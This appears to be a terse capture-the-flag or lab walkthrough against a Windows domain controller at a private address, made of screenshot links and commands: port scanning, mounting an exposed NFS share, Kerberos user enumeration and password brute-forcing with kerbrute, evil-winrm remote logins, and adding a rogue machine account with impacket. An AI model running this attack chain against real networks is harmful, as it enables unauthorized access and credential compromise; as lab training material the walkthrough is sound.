![image](https://github.com/stensil4rt/CodeBy/assets/62753044/e9f885fc-46ae-4438-8147-55ddccd9d2bb)

```
nmap -p- 192.168.2.9 -v -sC -sV
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/3f135770-5829-4738-8ae3-21ee2b0d72cb)

```
showmount -e 192.168.2.9
sudo mkdir /mnt/it_stuff
```

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/87e21d95-1046-46f1-a021-7ec017b15afe)

```
sudo mount -t nfs 192.168.2.9:/it_stuff /mnt/it_stuff -o nolock
sudo ls -la /mnt/it_stuff
sudo ls -la /mnt/it_stuff/Scripts
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/edd45ec3-db92-4e59-a9a2-8eb0caac3cd1)

```
./kerbrute_linux_amd64 userenum -d codeby.cdb --dc 192.168.2.9 user.txt
```

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/c648b73b-a853-4d2b-959c-5e1d21192ea7)

```
./kerbrute_linux_amd64 bruteuser -d codeby.cdb --dc 192.168.2.9 generated_passwords.txt valentin.badanov
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/11faab34-a8b6-4690-8585-4c3b01ac054f)

```
evil-winrm -i 192.168.2.9 -u 'valentin.badanov' -p 'PASS'
evil-winrm -i 192.168.2.9 -u 'valentin.badanov_adm' -p 'PASS'
impacket-addcomputer -computer-name 'evilcomputer$' -computer-pass ev1lP@sS -dc-ip 192.168.2.9 odeby.cdb/valentin.badanov_adm:'PASS' -no-add 
```
